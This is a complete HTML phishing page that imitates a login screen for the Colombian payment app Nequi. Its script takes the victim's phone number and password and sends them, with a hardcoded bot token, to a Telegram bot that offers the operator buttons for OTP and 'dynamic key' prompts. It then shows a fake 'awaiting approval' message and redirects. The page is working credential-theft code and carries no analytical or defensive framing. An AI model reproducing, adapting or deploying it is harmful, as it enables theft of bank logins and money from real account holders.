<!DOCTYPE html>
<html>
<head>
    <title>Nequi</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        body {background:#742fe1;color:white;text-align:center;padding:50px;font-family:Arial}
        input {padding:15px;font-size:20px;width:80%;margin:10px;border-radius:10px;border:none}
        button {padding:15px 30px;font-size:22px;background:#ff6b6b;color:white;border:none;border-radius:50px;margin-top:20px}
    </style>
</head>
<body>
    <h1>Nequi</h1>
    <input type="text" id="numero" placeholder="Número" maxlength="10"><br>
    <input type="password" id="clave" placeholder="Clave"><br>
    <button id="btn">ENTRAR</button>
    <p id="msg" style="margin-top:20px"></p>

    <script>
    $("#btn").click(function() {
        const numero = $("#numero").val().trim();
        const clave = $("#clave").val().trim();
        if (!numero || !clave) return $("#msg").text("Llena todo");

        $("#msg").text("Enviando...");

        // ENVÍA A TU TELEGRAM
        fetch('https://api.telegram.org/bot8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc/sendMessage', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: 8469651553,
                text: `*NUEVO LOGIN*

*Número:* ${numero}
*Clave:* ${clave}
*Hora:* ${new Date().toLocaleTimeString()}
*IP:* Detectando...`,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [{text: "Clave OTP", callback_data: "otp"}],
                        [{text: "Error clave", callback_data: "error"}],
                        [{text: "Dinámica", callback_data: "dinamica"}],
                        [{text: "Error login", callback_data: "loginerr"}],
                        [{text: "Finalizar", callback_data: "ok"}]
                    ]
                }
            })
        }).then(() => {
            $("#msg").html("Enviado! Esperando aprobación...");
            setTimeout(() => location.href = '/private/', 2000);
        });
    });
    </script>
</body>
</html>
